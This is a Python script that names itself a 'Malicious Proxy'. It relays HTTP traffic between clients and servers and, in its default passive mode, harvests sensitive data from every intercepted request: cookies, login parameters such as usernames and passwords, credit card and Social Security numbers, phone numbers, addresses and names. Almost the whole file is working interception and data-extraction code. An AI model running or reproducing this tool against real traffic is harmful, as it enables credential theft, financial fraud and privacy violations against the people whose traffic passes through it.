import argparse
import re
import socket
import select
import threading
from email.parser import BytesParser
from urllib.parse import parse_qs, urlparse
from termcolor import colored, cprint
from pprint import pprint
import nltk
from nltk.corpus import names, gazetteers

############################################################################################################# Helper Functions
nltk.download('names')
nltk.download('gazetteers')

def identify_common_thing(input_string, thing):
    # Get a list of common names from the NLTK names dataset
    common_thing = set(thing.words())
    
    input_string = re.split('[^a-zA-Z]', input_string)

    words_in_input = {x for x in input_string}
    common_thing_found = common_thing.intersection(words_in_input)

    return common_thing_found

def parse_http_headers(data):
    request_line, headers_alone = data.split(b'\r\n', 1)
    headers = BytesParser().parsebytes(headers_alone)

    return headers, request_line

def parse_request_line(request_line):
    method, url, protocol = request_line.split()
    parsed_url = urlparse(url)

    hostname = parsed_url.hostname
    port = parsed_url.port or 80  # Default to port 80

    return method, hostname, port

def receive_all(sock, length):
    # Helper function to receive all data until a specified length
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            break
        data += chunk
    return data

def full_receive(socket):
    data = socket.recv(4096)

    headers, remaining_data = data.split(b"\r\n\r\n", 1)
    header, request_line = parse_http_headers(data)

    if header['Content-Length'] is not None and int(header['Content-Length']) > len(remaining_data):
        content = receive_all(socket, int(header['Content-Length']) - len(remaining_data))
        full_response = data + content
    else:
        full_response = data
    
    return full_response

############################################################################################################# Real Stuff

def passive_scan(data):
    header, request_line = parse_http_headers(data)
    headers, body = data.split(b"\r\n\r\n", 1)
    method, url, protocol = request_line.split()
    parsed_url = urlparse(url)
    
    print(data)
    # cookie
    print(header["Cookie"]) 
    # username / email / password
    pprint(parse_qs(parsed_url.query.decode('utf-8')) or parse_qs(body.decode('utf-8')))
    # cc ssn
    cc_pattern = r'(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})'
    cc_matches = re.findall(cc_pattern, str(data))
    print(cc_matches)

    ssn_pattern = r'(\d{3}-\d{2}-\d{4}|XXX-XX-XXXX)'
    ssn_matches = re.findall(ssn_pattern, str(data))
    print(ssn_matches)

    # phone numbers
    phone_pattern = r'\b\d{3}-\d{3}-\d{4}\b'
    phone_matches = re.findall(phone_pattern, str(data))
    print(phone_matches)

    zipcode_pattern = r'\b\d{5}(?:-\d{4})?\b'
    zipcode_matches = re.findall(zipcode_pattern, str(data))
    print(zipcode_matches)

    address_pattern = r'\b(\d+\s*[+\s]+[\w\s]*[+\s](?:Street|St\.?|Avenue|Ave\.?|Boulevard|Blvd\.?|Road|Rd\.?|Lane|Ln\.?|Drive|Dr\.?|Court|Ct\.?|Place|Pl\.?))\b'
    address_matches = re.findall(address_pattern, str(data))
    print(address_matches)

    # common names
    print(identify_common_thing(str(data), names))

    # common cities
    print(identify_common_thing(str(data), gazetteers))



    
    


def handle_client(client_socket, addr, listen_mode):
    client_host, client_port = addr

    # Receive the client's first request
    request_data = client_socket.recv(4096)

    # Parse the incoming HTTP request
    header, request_line = parse_http_headers(request_data)
    method, hostname, port = parse_request_line(request_line)

    print(colored(f"[*] Accepted {method.decode('utf-8') } packet from {client_host}:{client_port}", 'green'))
    if listen_mode == 'passive':
            passive_scan(request_data)

    try:
        # Connect to the target server
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((hostname, port))

        while True:

            # send client data
            target_socket.send(request_data)

            # receive target response
            target_data = full_receive(target_socket)
            if not target_data:
                break

            # print(colored(f"[*] Packet from {hostname.decode('utf-8')}:{port}", 'red'))
            # print(target_data)

            # send target data
            client_socket.send(target_data)

            # wait for clients response
            request_data = full_receive(client_socket)
            if not request_data:
                break
            
            header, request_line = parse_http_headers(request_data)
            method, hostname, port = parse_request_line(request_line)
            print(colored(f"[*] {method.decode('utf-8') } packet from {client_host}:{client_port}", 'green'))
            if listen_mode == 'passive':
                passive_scan(request_data)
            
        # Close the connections
        client_socket.close()
        target_socket.close()
    except Exception as e:
        print(e)
    

def start_proxy(listen_mode, bind_host, bind_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((bind_host, bind_port))

    server.listen(5)
    print(colored(f"[*] Listening on {bind_host}:{bind_port}", 'green'))

    while True:
        client_socket, addr = server.accept()
        
        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr, listen_mode))
        client_handler.start()

if __name__ == '__main__':
    parse = argparse.ArgumentParser(description='Malicious Proxy')

    parse.add_argument("-m", "--listen_mode", default='passive')
    parse.add_argument("bind_host")
    parse.add_argument("bind_port", type=int)

    args = parse.parse_args()

    start_proxy(args.listen_mode, args.bind_host, args.bind_port)